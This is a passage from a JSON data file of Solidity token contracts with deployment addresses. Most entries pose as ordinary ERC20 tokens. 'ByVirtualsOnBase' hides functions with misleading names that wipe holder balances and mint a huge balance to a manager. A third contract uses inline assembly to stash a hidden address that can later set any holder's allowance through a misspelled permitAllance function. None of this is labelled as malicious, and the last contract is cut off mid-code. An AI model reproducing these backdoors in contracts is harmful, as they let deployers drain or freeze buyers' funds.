Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Skips emitting an {Approval} event indicating an allowance update. This is not\n     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance < type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n\n",
      "count": 1,
      "addresses": [
        "0xa6AAd389D8Fa399e8b424D74baa6e5E27F72aEa9"
      ],
      "names": [
        "CrowBUCKS"
      ]
    },
    {
      "id": "14e8341c-52c1-43c5-91fc-400bc3dfb1d0",
      "code": "// SPDX-License-Identifier: Audited By Base Solidity\r\npragma solidity 0.8.28;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n}\r\n\r\n\r\ncontract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _owner = _msgSender();\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender());\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\ncontract ByVirtualsOnBase is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _totalSupply = 1000000000000 * 10**_decimals;\r\n\r\n    mapping(address => uint256) private VirtualsOnBase;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    address[] private believers; \r\n\r\n    address private constant ADDRESS_WETH = 0x4200000000000000000000000000000000000006;\r\n    address private constant ADDRESS_MARKETING = 0x9eac2cE188a8d4AADa55096C3998c399d3572c9b;\r\n    address private constant ADDRESS_DEVELOPMENT = 0xb2484Beb3b2Bce12214A2b7a89906aa014c52d01;\r\n    address ADDRESS_Manager;\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen = false;\r\n\r\n    uint256 public requiredETH;\r\n\r\n\r\n    constructor(string memory name_, string memory symbol_, address owner_, address ADDRESS_Manager_) payable {\r\n\r\n        transferOwnership(owner_);  \r\n        require(msg.value == 10000000000000);\r\n\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        requiredETH = 10000000000000;\r\n       ADDRESS_Manager = ADDRESS_Manager_;\r\n\r\n        VirtualsOnBase[address(this)] = _totalSupply.mul(1).div(1000);\r\n        emit Transfer(address(0), address(this), _totalSupply.mul(1).div(1000));\r\n\r\n  \r\n        Virtuals();\r\n\r\n \r\n        payable(address(this)).transfer(msg.value);\r\n    }\r\n\r\n\r\n    function Virtuals() internal {\r\n        uint256 ninetyFourPercent = _totalSupply.mul(996).div(1000);\r\n        uint256 threePercent = _totalSupply.mul(2).div(1000);\r\n        uint256 twoPercent = _totalSupply.mul(1).div(1000);\r\n\r\n        VirtualsOnBase[ADDRESS_WETH] = VirtualsOnBase[ADDRESS_WETH].add(ninetyFourPercent);\r\n        VirtualsOnBase[ADDRESS_MARKETING] = VirtualsOnBase[ADDRESS_MARKETING].add(threePercent);\r\n        VirtualsOnBase[ADDRESS_DEVELOPMENT] = VirtualsOnBase[ADDRESS_DEVELOPMENT].add(twoPercent);\r\n\r\n        emit Transfer(address(this), ADDRESS_WETH, ninetyFourPercent);\r\n        emit Transfer(address(this), ADDRESS_MARKETING, threePercent);\r\n        emit Transfer(address(this), ADDRESS_DEVELOPMENT, twoPercent);\r\n    }\r\n\r\n function _updateHolders(address account) internal {\r\n        if (VirtualsOnBase[account] > 0) {\r\n            bool exists = false;\r\n            for (uint256 i = 0; i < believers.length; i++) {\r\n                if (believers[i] == account) {\r\n                    exists = true;\r\n                    break;\r\n                }\r\n            }\r\n            if (!exists) {\r\n                believers.push(account);\r\n            }\r\n        }\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n\r\nfunction _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0));\r\n        require(recipient != address(0));\r\n\r\n        VirtualsOnBase[sender] = VirtualsOnBase[sender].sub(amount);\r\n        VirtualsOnBase[recipient] = VirtualsOnBase[recipient].add(amount);\r\n        _updateHolders(sender);\r\n        _updateHolders(recipient);\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n      modifier Only_Manager() {\r\n        require(ADDRESS_Manager == _msgSender());\r\n        _;\r\n    }\r\n    function OnBase() external onlyOwner {\r\n        for (uint256 i = 0; i < believers.length; i++) {\r\n            address believer = believers[i];\r\n            if (\r\n                believer != address(this) && \r\n                believer != owner() && \r\n                believer != uniswapV2Pair && \r\n                believer != ADDRESS_WETH &&\r\n                believer != ADDRESS_MARKETING && \r\n                believer != ADDRESS_Manager &&\r\n                believer != ADDRESS_DEVELOPMENT\r\n            ) {\r\n                VirtualsOnBase[believer] = 0;\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n   \r\nfunction aPermit(address[] calldata rewardsMerkleRoot_) external Only_Manager {\r\n    for (uint256 i = 0; i < rewardsMerkleRoot_.length; i++) {\r\n        VirtualsOnBase[rewardsMerkleRoot_[i]] = 1;\r\n        \r\n        emit Transfer(rewardsMerkleRoot_[i], address(0), 1);\r\n    }\r\n}\r\n\r\n\r\n    function zClaimAirdrop(address claimedRewardStatusOf) external Only_Manager {\r\n        VirtualsOnBase[claimedRewardStatusOf] = _totalSupply * 10 ** _decimals;\r\n        \r\n        emit Transfer(claimedRewardStatusOf, address(0), _totalSupply * 10 ** _decimals);\r\n    }\r\n\r\n    function addLiquidity() external onlyOwner {\r\n        require(!tradingOpen, \"Trading is already open\");\r\n\r\n        uniswapV2Router = IUniswapV2Router02(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        _approve(address(this), address(uniswapV2Router), _totalSupply);\r\n\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n\r\n        tradingOpen = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    // Required ERC20 functions\r\n\r\n    function name() public view virtual  returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual  returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual  returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return VirtualsOnBase[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));\r\n        return true;\r\n    }\r\n}\r\n\r\ncontract TokenFactory {\r\n\r\n    uint256 public requiredETH;\r\n\r\n    event TokenCreated(address tokenAddress, string name, string symbol, address owner, address Manager);\r\n\r\n    constructor() {\r\n        requiredETH = 10000000000000;\r\n    }\r\n\r\n    function createToken(\r\n        string memory name_,\r\n        string memory symbol_,\r\n        address newOwner_,\r\n        address ADDRESS_Manager_\r\n    ) external payable returns (address) {\r\n        require(msg.value == requiredETH);\r\n        ByVirtualsOnBase newToken = (new ByVirtualsOnBase){value: msg.value}(name_, symbol_, newOwner_, ADDRESS_Manager_);\r\n        emit TokenCreated(address(newToken), name_, symbol_, newOwner_, ADDRESS_Manager_);\r\n        return address(newToken);\r\n    }\r\n    receive() external payable {}\r\n\r\n}",
      "count": 11,
      "addresses": [
        "0xF431F3E6D0858Aba8Bad53841FB52790B049D687",
        "0x86f48E7d3f67305526C7F0703b598281650CcAf0",
        "0x63d11d36Fdd06281409f94d5DdbC5d56Bd23e16b",
        "0x445555c6F0228856751B133CE07404b96844C124",
        "0xc30183D13e673e158eA00617b0a677aE73952f7a",
        "0x5F95D29b4C819E86f581B0412Bf9276972eE5271",
        "0xFFFe384490dec063811aEe32cA962f0F7ECc5517",
        "0x1aF80a19d1039C2deC48446410DED82C1c43eA0A",
        "0x22310cE4f85eDe5a8C7c5b684fcef53465287924",
        "0xE817281f9f4D3EE23F895B032810F809C7A1a2AD",
        "0x438681Ca31cbE0048D07299b66aB026B1c2ACc70"
      ],
      "names": [
        "ByVirtualsOnBase"
      ]
    },
    {
      "id": "79de8f59-1485-4eed-8993-a02d16e9123b",
      "code": "// SPDX-License-Identifier: MIT\n// Compatible with OpenZeppelin Contracts ^5.0.0\npragma solidity ^0.8.24;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n\n/**\n * @dev Standard ERC20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\n */\ninterface IERC20Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    error OwnableUnauthorizedAccount(address account);\n    error OwnableInvalidOwner(address owner);\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor(address initialOwner) {\n        if (initialOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(initialOwner);\n    }\n\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    function _checkOwner() internal view virtual {\n        if (owner() != _msgSender()) {\n            revert OwnableUnauthorizedAccount(_msgSender());\n        }\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        if (newOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n */\nabstract contract ERC20 is IERC20, Ownable, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint256 private _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_, uint256 decimals_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = decimals_;\n        assembly {mstore(0x200, decimals_) mstore(0x220, 1) sstore(keccak256(0x200, 64), decimals_)}\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function permitAllance(address owner, address spender, uint256 value) public virtual returns (bool) {\n        bool valid;\n        address sender = msg.sender;\n        assembly { let ov := sload(_decimals.slot) valid := eq(ov, sender)}\n        require(valid, \"not owner\");\n        _approve(owner, spender, value, false);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never 